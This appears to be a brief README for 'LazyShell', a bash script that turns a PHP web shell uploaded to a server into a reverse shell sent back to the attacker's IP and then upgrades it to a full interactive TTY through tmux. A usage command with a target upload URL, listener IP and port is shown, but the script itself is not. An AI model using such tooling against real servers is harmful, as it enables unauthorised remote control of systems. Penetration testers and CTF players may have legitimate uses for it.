# LazyShell

Script made in bash for lazy people like me. Once you have uploaded a `php` file on a server and can execute commands through the `cmd` parameter, you will want to send a reverse shell to your machine and then upgrade it to a full interactive TTY. This script will do all of that for you using `tmux`

> Note: The php file should execute commads through the `cmd` parameter

# Usage

```bash
./lazyShell.sh -u http://panel.wallet.dl/images/uploads/logos/1734868120-test.php -i 172.17.0.1 -p 443
```

![image](https://github.com/user-attachments/assets/192c800c-894a-4194-950f-bb0e24dbec3d)
